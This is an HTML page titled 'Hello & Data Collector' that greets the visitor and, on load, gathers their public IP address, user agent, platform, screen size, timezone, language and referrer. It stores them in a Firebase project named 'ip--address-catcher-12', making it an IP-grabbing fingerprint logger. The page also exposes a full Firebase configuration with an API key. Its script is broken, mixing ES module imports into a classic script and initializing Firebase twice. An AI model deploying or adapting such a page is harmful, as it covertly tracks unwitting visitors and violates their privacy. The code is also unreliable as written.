<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Hello & Data Collector</title>
<style>
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
      Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
    background: #f9f9f9;
    color: #333;
    padding: 2rem;
    max-width: 600px;
    margin: auto;
  }
  h1 {
    text-align: center;
    margin-bottom: 1rem;
  }
  .status {
    margin-top: 2rem;
    font-style: italic;
    color: #555;
    text-align: center;
  }
</style>
</head>
<body>
  <h1>Hello!</h1>
  <div class="status" id="status">Collecting data...</div>

<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
<script>
  // --- Paste your Firebase config here ---
  // Import the functions you need from the SDKs you need
import { initializeApp } from "firebase/app";
import { getAnalytics } from "firebase/analytics";
// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyApoNEdlKTIhjYyCTQTjhkdsIotxs3YaKU",
  authDomain: "ip--address-catcher-12.firebaseapp.com",
  databaseURL: "https://ip--address-catcher-12-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "ip--address-catcher-12",
  storageBucket: "ip--address-catcher-12.firebasestorage.app",
  messagingSenderId: "1049666257395",
  appId: "1:1049666257395:web:a2e4418ea89ecf59511286",
  measurementId: "G-J30PRNTW1M"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);

  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);
  const db = firebase.firestore();

  // Utility function to get public IP using ipify
  async function getPublicIP() {
    try {
      const res = await fetch("https://api64.ipify.org?format=json");
      const data = await res.json();
      return data.ip;
    } catch {
      return "Unavailable";
    }
  }

  // Collect all data
  async function collectData() {
    const ip = await getPublicIP();
    const ua = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
    const screenRes = `${screen.width}x${screen.height}`;
    const dateTime = new Date().toISOString();
    const referrer = document.referrer || "Direct";

    // Basic OS guess from userAgent (very simplified)
    let os = "Unknown";
    if (ua.indexOf("Win") !== -1) os = "Windows";
    else if (ua.indexOf("Mac") !== -1) os = "MacOS";
    else if (ua.indexOf("Linux") !== -1) os = "Linux";
    else if (ua.indexOf("Android") !== -1) os = "Android";
    else if (ua.indexOf("like Mac") !== -1) os = "iOS";

    return {
      ip,
      userAgent: ua,
      platform,
      os,
      screenRes,
      language,
      timezone,
      dateTime,
      referrer,
    };
  }

  // Save data to Firestore
  async function saveData() {
    const statusEl = document.getElementById("status");
    try {
      const data = await collectData();
      await db.collection("userData").add(data);
      statusEl.textContent = "Data collected and stored successfully!";
    } catch (err) {
      statusEl.textContent = "Error saving data: " + err.message;
    }
  }

  saveData();
</script>
</body>
</html>
